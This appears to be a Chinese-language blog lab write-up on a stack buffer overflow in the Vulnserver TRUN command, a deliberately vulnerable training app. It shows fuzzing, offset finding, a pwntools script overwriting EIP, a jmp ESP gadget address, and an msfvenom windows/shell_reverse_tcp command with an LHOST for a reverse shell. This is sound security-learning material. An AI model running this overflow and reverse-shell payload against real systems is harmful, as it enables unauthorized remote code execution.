---
title: Vulnserver (TRUN) Windows Overflow
date: 2021-08-25T23:36:00+08:00
draft: false
url: "/2021/08/25/vulnserver-trun-windows-overflow/"
categories:
  - 資訊安全
  - Windows
showToc: true
...
- cyclicpwntools 功能 (我覺得用起來比較順手)`pwn cyclic`或是在 python 裡面的 `pwn.cyclic()`
- 可以產出 cyclic 字串
- ![](/uploads/2022/02/394c3-OzecgUw.png)`pwn cyclic -l {Pattern in hex}`- 隨便取 4 個值，都能知道他 offset 第幾格
- ![](/uploads/2022/02/d842b-ILy486S.png)msf 功能- `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {length}`產出長度為 length 的字串`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {length} -q {pattern}`- ![](/uploads/2022/02/36dfa-8MlUt3J.png)Fuzz 腳本- `generic_send_tcp {IP} {Port} {腳本.spk} 0 0`
...
- 第一步，nc 上去觀察![](/uploads/2022/02/bb111-N3hbhOM.png)這次要打ㄉ洞是 TRUN- 基本指令是 `TRUN {something}`
- ![](/uploads/2022/02/f36d7-hx8bRe7.png)
...
- 執行`generic_send_tcp 192.168.1.102 9999 trun1.spk 0 0`
- ![](/uploads/2022/02/506a5-KOACrib.png)Run 下去隔了幾秒鐘， Debugger 就跳卡住了- ![](/uploads/2022/02/276b8-FlAKrgn.png)
- 下面有寫是 `0x41414141` 位子錯誤
- 然後可以發現 `EIP` 也被變成了 `0x41414141`
- `0x41` 是 `A`觀察 EAX- 發現 Command 的開頭是 `TRUN /.:/AAA....`
- 只是我們不知道 Fuzz 有戳幾個 `A`
- 但確定他的開頭是 `TRUN /.:/`
...
- 觀察 EIP![](/uploads/2022/02/d7714-nOxDvWA.png)
- 值為 0x61616275輸入 `pwn cyclic -l 0x61616275`- ![](/uploads/2022/02/5c98d-QnQ0l5m.png)
- 就能知道 offset 是 `2003`測試 Offset 是否正確- 這邊用 `0xdeadbeef` 進行測試`from pwn import * r = remote("192.168.1.102",9999) command = b"TRUN /.:/" padding = b'a'*2003 meow = p32(0xdeadbeef) payload = command + padding + meow r.sendline(payload)`- 發現可以成功蓋到 EIP 了
- ![](/uploads/2022/02/ad32f-6eLQLUz.png)
...
- 一樣用 cyclic![](/uploads/2022/02/66490-tJc4O2t.png)
- 會發現 ESP 指向 `aaaa`
- 也就是 `0x61616161`
- ![](/uploads/2022/02/3bccc-aVw8GwN.png)
- 就是說，我們的 address 後面直接接的東西會被 EIP 所指到

## 找 Shell Code 跳躍點

- 理論上我們在目前寫的後面 shell_code並且把 new_eip 設定為 `jmp ESP` 即可在 immunity debugger 下面輸入- `!mona jmp -r esp` 可以找到 `jmp ESP` 的指令![](/uploads/2022/02/e8f7c-dgL01fP.png)
- 第一個在 `0x625011af`所以我們把 EIP 蓋成這個，他接下來就會跳去 EIP 指到的 Memory- 並且執行我們的 Shell Code

## 生 Reverse shell

- 接著要想辦法生成 reverse shell 的 shell code
- 這邊可以直接用 `msfvenom` 處理`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.106 LPORT=7877 EXITFUNC=thread -f c -a x86 -b "\x00"`
- ![](/uploads/2022/02/eb497-Ebkz3zb.png)整理一下貼到 Python再在前面增加幾個 nop (0x90)做 padding- 避免直接跳出現一些問題
...
- 本地端開 nc 接 Shell![](/uploads/2022/02/236a6-DFp6IBy.png)成功!!
